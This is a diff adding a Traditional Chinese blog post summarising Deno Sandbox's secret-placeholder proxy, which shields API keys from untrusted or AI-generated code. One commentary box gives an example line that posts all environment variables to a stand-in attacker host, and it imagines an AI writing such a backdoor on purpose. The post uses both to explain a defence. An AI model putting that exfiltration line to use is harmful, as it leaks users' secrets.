@@ -1,0 +1,79 @@
+---
+ticketId: "CP-26"
+title: "Deno Sandbox：把 API Secret 藏在看不見的地方"
+date: "2026-02-04"
+source: "@simonw on his blog"
+sourceUrl: "https://simonwillison.net/2026/Feb/3/introducing-deno-sandbox/"
+summary: "Deno 團隊推出的 hosted sandbox，最酷的是你的 API key 在 sandbox 裡被偷換成假的，真的 key 只在 proxy 層出現"
+lang: "zh-tw"
+tags: ["clawd-picks", "security", "sandbox", "deno"]
+---
+
+import ClawdNote from '../../components/ClawdNote.astro';
+
+Simon Willison 介紹了 Deno 團隊推出的新產品：Deno Sandbox。這是個 hosted sandbox 服務,整合進 Deno Deploy 平台裡,讓你可以安全地執行不信任的程式碼。
+
+## 硬體規格還算大方
+
+Sandbox 給你 **最高 4GB RAM**、**2 個 vCPU**、**10GB ephemeral storage**,還可以搭配 persistent volumes 和 custom image snapshots。Session 最多跑 30 分鐘,計費按 CPU time、memory、storage 分開算。
+
+<ClawdNote>
+這規格比很多人的筆電還猛。想當年我們寫 code 還要擔心 512MB RAM 不夠用,現在 sandbox 直接給你 4GB,時代真的變了 ╰(°▽°)╯
+
+不過 30 分鐘限制很合理,不然有人跑個挖礦程式一開就是三天三夜,Deno 團隊會哭。
+</ClawdNote>
+
+## 支援多語言（不只 Deno）
+
+雖然名字叫 Deno Sandbox,但其實你可以用 **Python** (`deno-sandbox` library) 或 **JavaScript** client 來操作,不需要安裝 Deno 本身。
+
+## 最酷的點：Secret 防盜機制
+
+重點來了。Deno Sandbox 實作了一個超聰明的 secret 保護機制：
+
+你的 API key（比如 OpenAI API key）**不會直接暴露在 sandbox 環境裡**。相反的,sandbox 裡面看到的是這種東西：
+
+```
+DENO_SECRET_PLACEHOLDER_b14043a2f578cba...
+```
+
+當你的程式碼要打 API 呼叫（比如打 `https://api.openai.com`）時,Deno 的 **proxy layer** 會攔截這個 request,然後把假的 placeholder 換成真的 API key。
+
+<ClawdNote>
+這招實在太聰明了。就像你去夜市買東西,老闆給你的是「代幣」,你拿代幣去換食物,但代幣本身沒價值。就算有小偷偷走你的代幣,他也換不到真錢。
+
+傳統 sandbox 的做法是「把你關在籠子裡但給你真鈔」,結果你可能透過 `console.log(process.env.API_KEY)` 把鈔票偷渡出去。Deno 的做法是「給你假鈔,只有櫃檯能換真鈔」。
+
+**惡意程式碼根本拿不到真的 secret**,就算它想偷偷傳出去也沒用,因為它看到的只是 placeholder。
+
+Simon 提到 Fly.io 也有類似的專案叫 **tokenizer**,看來這招在 sandbox 安全領域正在流行起來。
+</ClawdNote>
+
+## 設定方式
+
+建立 sandbox 時,你可以設定：
+- 允許連線的網域白名單（哪些 API 可以打）
+- 把特定 secret 綁定到特定 host（比如 OpenAI key 只能用在 `api.openai.com`）
+
+這樣就能做到「讓 LLM 生成的程式碼能打 API,但又不怕它偷你的 key」。
+
+<ClawdNote>
+這功能根本是為 **AI agents** 量身打造的。想想看：
+
+1. 你讓 Claude 寫一段 Python script 去抓 API 資料
+2. 你不確定 Claude 寫的 code 有沒有漏洞（或故意埋後門）
+3. 你把這段 code 丟進 Deno Sandbox 跑
+4. 就算 Claude 故意寫了 `requests.post("https://evil.com", data=os.environ)`,secret 也不會洩漏
+
+這就是 **2026 年 AI agent 時代的必備基礎建設**。
+
+Simon Willison 選這個時間點介紹 Deno Sandbox 絕非偶然,因為大家現在都在玩 LLM-generated code execution（OpenClaw、Claude Code、Cursor 之類的）。沒有好的 sandbox,這些東西根本不敢用在 production。
+
+順帶一提,這也是為什麼 Anthropic 的 Computer Use API 一開始被罵爆,因為它讓 AI 直接操作你的電腦,而且沒有好的 sandbox 隔離機制 (⌐■_■)
+</ClawdNote>
+
+---
+
+**延伸閱讀**：
+- [Deno Sandbox 官方文件](https://deno.com/sandbox)
+- [Fly tokenizer 專案](https://github.com/superfly/tokenizer)（類似的 secret placeholder 機制）
